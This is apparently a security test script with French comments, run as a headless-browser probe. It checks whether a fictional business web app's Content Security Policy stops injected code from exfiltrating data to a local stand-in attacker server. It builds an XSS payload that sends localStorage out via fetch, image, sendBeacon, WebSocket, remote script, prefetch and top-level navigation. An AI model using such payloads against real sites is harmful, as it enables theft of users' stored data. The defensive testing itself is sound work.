// GARDE de l'audit de sécurité (étape 7, 17 novembre 2026) : S10 (politique de contenu + référent), S16 (empreintes des bibliothèques) et S18 (aucune feuille de polices tierce). Copie de securite/dependances-csp.js, jouée contre les pages CORRIGÉES au niveau « inline » (le script en ligne s'exécute, MAIS rien ne peut sortir).
// Angle « dépendances » · sonde 2 : UNE INJECTION PEUT-ELLE FAIRE SORTIR LES DONNÉES ? et la politique de contenu proposée casse-t-elle l'usage normal ?
// A. un « attaquant » (serveur local sur un AUTRE port de 127.0.0.1 : autre origine) reçoit ou non ce que le code injecté lui envoie par six canaux :
//    fetch POST (contenu du rangement), image, balise d'envoi (sendBeacon), WebSocket, script chargé de chez lui, préchargement de lien.
//    Le code arrive par une vraie entrée prouvée par l'angle « injection » (injection-01 : le prénom d'une personne s'écrit TEL QUEL dans le planning).
// B. usage normal : les 36 écrans du gérant, la carte, l'atelier de documents (et son PDF), la Comptabilité, le paiement, le module de courrier : zéro violation de la politique.
// Se joue contre les pages d'origine (RACINE par défaut : elles n'ont AUCUNE politique, A tombe) puis contre la copie corrigée :
//   python3 dependances-corrections.py && RACINE=/tmp/opg-dependances-copie node dependances-csp.js            (OPG_NIVEAU=hash : le gestionnaire injecté ne s'exécute même pas)
//   OPG_NIVEAU=inline python3 dependances-corrections.py && OPG_ATTENDU=inline RACINE=/tmp/opg-dependances-copie node dependances-csp.js   (le script injecté S'EXÉCUTE, mais ne peut rien envoyer)
// ⛔ 127.0.0.1 seulement, entreprise fictive. Rien ne sort : toute requête vers un autre hôte reçoit une copie locale (bibliothèques) ou un refus.
const L = require('../lib.js'), A = require('../sondes/atelier-outils.js'), fs = require('fs'), http = require('http');
const DEP = '/tmp/claude-0/-home-user-teamop/8050f26e-cdde-5a38-bb11-ba578db16f81/scratchpad/dep/';
const SORTIE = '/tmp/claude-0/-home-user-teamop/8050f26e-cdde-5a38-bb11-ba578db16f81/scratchpad/cap/dependances/';
const INIT_VIOL = "(() => { try { const t = window.top; t.__viol = t.__viol || []; document.addEventListener('securitypolicyviolation', e => { try { t.__viol.push(e.violatedDirective + ' ' + String(e.blockedURI).slice(0, 80)); } catch (x) {} }); } catch (x) {} })()";
const MARQUE = 'ZXQ-DEP-5530';
const ATTENDU = process.env.OPG_ATTENDU || 'inline';   // 'hash' : ni exécution ni envoi · 'inline' : exécution possible, aucun envoi
const AVEC_POLITIQUE = !process.env.OPG_SANS_POLITIQUE;   // les pages du dépôt portent désormais leur politique : la garde les joue AVEC (OPG_SANS_POLITIQUE=1 : le témoin, sur des pages qu'on aurait dépouillées)
const LOCALES = { 'leaflet.min.js': 'application/javascript', 'leaflet.min.css': 'text/css', 'maplibre-gl.min.js': 'application/javascript', 'maplibre-gl.min.css': 'text/css', 'leaflet-maplibre-gl.js': 'application/javascript', 'html2canvas.min.js': 'application/javascript' };
const TILEJSON = JSON.stringify({ tilejson: '3.0.0', tiles: ['https://tiles.openfreemap.org/planet/x/{z}/{x}/{y}.pbf'], vector_layers: [], minzoom: 0, maxzoom: 14 });
(async () => {
  fs.mkdirSync(SORTIE, { recursive: true });
  // ── l'attaquant : un serveur d'une AUTRE origine, qui note ce qui lui arrive ──
  const recu = []; let portAtt = 0;
  const srv = http.createServer((q, r) => { const chunks = []; q.on('data', d => chunks.push(d)); q.on('end', () => { const corps = Buffer.concat(chunks).toString('utf8'); recu.push({ canal: q.url.split('?')[0], methode: q.method, taille: corps.length, marque: corps.includes(MARQUE), debut: corps.slice(0, 60), referer: q.headers.referer || '' });
    if (q.url.startsWith('/s.js')) { r.writeHead(200, { 'content-type': 'application/javascript', 'access-control-allow-origin': '*' }); return r.end('window.__scriptAttaquant=1;'); }
    r.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': 'text/plain' }); r.end('ok'); }); });
  srv.on('upgrade', (q, sock) => { recu.push({ canal: q.url.split('?')[0], methode: 'WS', taille: 0, debut: '', referer: q.headers.origin || '' }); sock.destroy(); });
  await new Promise(ok => srv.listen(0, '127.0.0.1', () => { portAtt = srv.address().port; ok(); }));
  const ATT = 'http://127.0.0.1:' + portAtt;
  const code = [
    'window.__pwn=(window.__pwn||0)+1',
    'var A=&quot;' + ATT + '&quot;',
    'fetch(A+&quot;/f&quot;,{method:&quot;POST&quot;,mode:&quot;no-cors&quot;,body:JSON.stringify(localStorage)})',
    'new Image().src=A+&quot;/i&quot;',
    'navigator.sendBeacon(A+&quot;/b&quot;,&quot;x&quot;)',
    'try{new WebSocket(A.replace(&quot;http&quot;,&quot;ws&quot;)+&quot;/w&quot;)}catch(e){}',
    'var s=document.createElement(&quot;script&quot;);s.src=A+&quot;/s.js&quot;;document.head.appendChild(s)',
    'var l=document.createElement(&quot;link&quot;);l.rel=&quot;prefetch&quot;;l.href=A+&quot;/p&quot;;document.head.appendChild(l)'
  ].join(';');
  const CHARGE = '<img src=x onerror="' + code + '">';
  const CANAUX = { '/f': 'fetch (POST du rangement)', '/i': 'image', '/b': 'sendBeacon', '/w': 'WebSocket', '/s.js': 'script de l\'attaquant', '/p': 'préchargement de lien' };

  const c = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 900, init: INIT_VIOL });
  // toute requête vers un autre hôte que 127.0.0.1 : copie locale ou refus (jamais le réseau)
  await c.ctx.route(u => { const s = u.toString(); return /^https?:/.test(s) && !/^https?:\/\/127\.0\.0\.1[:/]/.test(s); }, async r => {
    const nom = r.request().url().split('/').pop().split('?')[0];
    if (LOCALES[nom] && fs.existsSync(DEP + nom)) return r.fulfill({ status: 200, contentType: LOCALES[nom], headers: { 'access-control-allow-origin': '*' }, body: fs.readFileSync(DEP + nom) });
    if (/openfreemap\.org\/planet$/.test(r.request().url())) return r.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: TILEJSON });
    return r.abort('blockedbyclient'); });
  const politique = await c.p.evaluate(() => { const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); return m ? m.content : ''; });
  console.log('politique de contenu de la page : ' + (politique ? politique.length + ' signes' : 'AUCUNE'));
  L.v('population : la page ' + (AVEC_POLITIQUE ? 'corrigée porte une politique de contenu (sinon la copie n\'est pas la bonne)' : 'd\'origine est ouverte (témoin : aucune politique)'), AVEC_POLITIQUE ? politique.length > 200 : politique === '');
  // la politique de référent aussi (en-tête Referer vers les tiers)
  const refMeta = await c.p.evaluate(() => { const m = document.querySelector('meta[name=referrer]'); return m ? m.content : ''; });
  L.v('0. la page déclare sa politique de référent (« same-origin » : aucun tiers ne voit l\'origine de l\'application) — valeur : ' + (refMeta || 'aucune'), refMeta === 'same-origin', refMeta);

  // ══ A. l'injection ══
  const equipe = await c.p.evaluate(() => EQUIPE.length);
  L.v('population : l\'équipe compte plusieurs personnes (la charge se pose chez celles et ceux qui travaillent sur le terrain)', equipe >= 3, equipe);
  // le gérant compose un devis (ce que l'appareil range : nom d'un client, prix) — c'est ce que l'attaquant veut lire
  const f0 = await A.ouvrirAtelier(c, 'devis', 'devis');
  L.v('population : l\'atelier s\'ouvre (le devis qu\'on compose est ce qu\'il y a à voler)', !!f0);
  await A.composerDevis(c, f0, { client: 'hp', objet: 'Devis ' + MARQUE, articles: [{ ref: 'GS-20', qte: 2 }] });
  await f0.locator('[data-act="retour"]:visible').first().click().catch(() => {}); await c.p.waitForTimeout(900);
  const stock = await c.p.evaluate(m => ({ cles: Object.keys(localStorage).length, marque: Object.keys(localStorage).some(k => localStorage.getItem(k).includes(m)) }), MARQUE);
  L.v('population : le rangement de l\'appareil contient le devis composé (marque trouvée) — sinon rien à voler', stock.marque, stock);
  // depuis la correction de S03 (un nom de personne est nettoyé), l'ancienne porte d'entrée du prénom est fermée : on SUPPOSE ici qu'une injection a réussi
  // quelque part (toast() écrit son message en HTML : c'est la porte que la politique doit encore tenir fermée) — la politique est la SECONDE barrière
  await c.p.evaluate(ch => { toast(ch); }, CHARGE);
  await c.p.waitForTimeout(2500);
  const pwn = await c.p.evaluate(() => window.__pwn || 0);
  console.log('code injecté exécuté :', pwn, 'fois · requêtes reçues par l\'attaquant :', recu.length);
  recu.forEach(x => console.log('   reçu', x.methode, x.canal, x.taille + ' o', x.debut ? '« ' + x.debut.replace(/\n/g, ' ') + ' »' : '', x.referer ? '| ' + x.referer : ''));
  if (!AVEC_POLITIQUE) L.v('population : (témoin sans politique) le code injecté S\'EXÉCUTE — sinon rien ne se prouve — exécutions : ' + pwn, pwn >= 1, pwn);
  else if (ATTENDU === 'hash') L.v('1. le gestionnaire injecté ne s\'exécute pas (un script en ligne sans empreinte n\'est pas exécuté) — exécutions : ' + pwn, pwn === 0, pwn);
  else L.v('population : (niveau « inline ») le gestionnaire injecté S\'EXÉCUTE — c\'est la condition de la mesure suivante', pwn >= 1, pwn);
  for (const [k, nom] of Object.entries(CANAUX)) { const n = recu.filter(x => x.canal === k).length;
    L.v('2. canal « ' + nom + ' » : rien n\'atteint l\'attaquant — reçus : ' + n, n === 0, n); }
  const refus = (await c.p.evaluate(() => window.__viol || []));
  if (AVEC_POLITIQUE) { console.log('refus relevés par le navigateur pendant l\'injection : ' + refus.length + (refus[0] ? ' · ex. « ' + String(refus[0]).slice(0, 170) + ' »' : ''));
    L.v('population : le navigateur a REFUSÉ quelque chose pendant l\'injection (le détecteur de violations voit bien) — refus : ' + refus.length, refus.length >= 1, refus.length); }
  const vole = recu.find(x => x.canal === '/f');
  if (!AVEC_POLITIQUE) L.v('population : (témoin sans politique) le POST reçu par l\'attaquant contient le devis composé — ' + (vole ? vole.taille : 0) + ' octets, marque ' + (vole && vole.marque), !!vole && vole.marque, vole);
  await c.p.screenshot({ path: SORTIE + 'injection-' + (AVEC_POLITIQUE ? ATTENDU : 'origine') + '.png' });
  // l'écran reste utilisable : le texte de la personne s'affiche comme texte (ou la charge est inerte), pas d'écran cassé
  const vivant = await c.p.evaluate(() => !!document.getElementById('contenu') && document.getElementById('contenu').innerText.length > 100);
  L.v('population : le planning reste affiché', vivant);
  // remise en état : on recharge (le prénom piégé n'est pas rangé : il vivait en mémoire)
  const aVoirApres = recu.length;
  recu.length = 0;
  await L.fin(c);

  // ══ B. usage normal sous la politique ══
  const d = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 900, init: INIT_VIOL });
  await d.ctx.route(u => { const s = u.toString(); return /^https?:/.test(s) && !/^https?:\/\/127\.0\.0\.1[:/]/.test(s); }, async r => {
    const nom = r.request().url().split('/').pop().split('?')[0];
    if (LOCALES[nom] && fs.existsSync(DEP + nom)) return r.fulfill({ status: 200, contentType: LOCALES[nom], headers: { 'access-control-allow-origin': '*' }, body: fs.readFileSync(DEP + nom) });
    if (/openfreemap\.org\/planet$/.test(r.request().url())) return r.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: TILEJSON });
    return r.abort('blockedbyclient'); });
  const routes = await d.p.evaluate(() => Object.keys(vues()));
  L.v('population : les écrans sont comptés (≥ 30)', routes.length >= 30, routes.length);
  for (const r of routes) { await d.p.evaluate(h => { location.hash = '#' + h; }, r); await d.p.waitForTimeout(220); }
  await d.p.evaluate(() => { location.hash = '#planning'; }); await d.p.waitForTimeout(400);
  await d.p.evaluate(() => { try { plVue = 'carte'; rendre(); } catch (e) {} }); await d.p.waitForTimeout(3000);
  const lib = await d.p.evaluate(() => ({ L: !!(window.L && L.map), gl: !!window.maplibregl, plugin: !!(window.L && L.maplibreGL) }));
  L.v('population : la carte a chargé ses trois bibliothèques (Leaflet, MapLibre, plugin) — sinon la politique ne peut pas être éprouvée dessus', lib.L && lib.gl && lib.plugin, lib);
  const f = await A.ouvrirAtelier(d, 'devis', 'devis');
  L.v('population : l\'atelier de documents s\'ouvre', !!f);
  if (f) { await f.evaluate(() => pdfCharger().catch(() => {})).catch(() => {}); await d.p.waitForTimeout(700); const h2 = await f.evaluate(() => !!window.html2canvas); L.v('population : html2canvas (PDF) se charge dans l\'atelier', h2, h2); }
  await d.p.evaluate(() => { try { cpSysAllerRubrique('comptabilite'); } catch (e) {} }); await d.p.waitForTimeout(2200);
  const cm = L.cadre(d.p, /prototype-comptabilite/); L.v('population : la Comptabilité s\'ouvre dans son cadre', !!cm);
  await d.p.evaluate(() => { try { cpSysteme = false; } catch (e) {} location.hash = '#courrier'; }); await d.p.waitForTimeout(2500);
  const co = await d.p.evaluate(() => !!window.OPCourrier); L.v('population : le module de courrier est chargé', co);
  // le paiement : on cherche l'écran qui porte son cadre
  // le paiement : son écran (Trésorerie › Paiement en ligne) porte un cadre ; on le fait fabriquer par la fonction de la page, dans une zone à part
  await d.p.evaluate(() => { const z = document.createElement('div'); z.id = 'zone-sonde-paiement'; z.style.cssText = 'position:fixed;left:0;top:0;width:900px;height:600px;z-index:99999;background:#fff'; z.innerHTML = cxVueEnLigne(); document.body.appendChild(z); });
  await d.p.waitForTimeout(2000);
  const pai = L.cadre(d.p, /prototype-paiement/);
  L.v('population : le module de paiement s\'ouvre dans son cadre', !!pai);
  if (pai) { const t = await pai.evaluate(() => document.body.innerText.length); L.v('population : le module de paiement affiche du texte (il a démarré malgré la politique)', t > 200, t); }
  const violations = (await d.p.evaluate(() => window.__viol || [])).concat(d.err.filter(e => /Content Security Policy|Refused to/i.test(e)));
  console.log('erreurs de la page :', d.err.length, '· violations de politique :', violations.length); violations.slice(0, 6).forEach(v => console.log('   ', v.slice(0, 260)));
  L.v('3. usage normal : zéro violation de la politique sur ' + routes.length + ' écrans + carte + atelier + PDF + Comptabilité + courrier + paiement', violations.length === 0, violations.slice(0, 3));
  await d.p.screenshot({ path: SORTIE + 'usage-' + (AVEC_POLITIQUE ? ATTENDU : 'origine') + '.png' });
  await L.fin(d);

  // ══ C. ce qu'une politique de contenu NE bloque pas (dit, pas masqué) : la navigation ══
  const e = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 700 });
  recu.length = 0;
  await e.p.evaluate(u => { const x = document.createElement('img'); x.src = 'x'; x.setAttribute('onerror', 'location.href="' + u + '/nav?d="+encodeURIComponent(Object.keys(localStorage).join(","))'); document.body.appendChild(x); }, ATT);
  await e.p.waitForTimeout(1500);
  const nav = recu.filter(x => x.canal === '/nav');
  console.log('RESTE (non bloquable par la politique) : navigation du haut de page vers l\'attaquant, reçue ' + nav.length + ' fois' + (ATTENDU === 'hash' && AVEC_POLITIQUE ? ' (en niveau « hash » le gestionnaire ne part pas : 0 attendu)' : ''));
  await L.fin(e); srv.close(); await L.fermer();
  process.exit(L.bilan() ? 1 : 0);
})().catch(e => { console.error('SONDE MORTE', e); process.exit(2); });
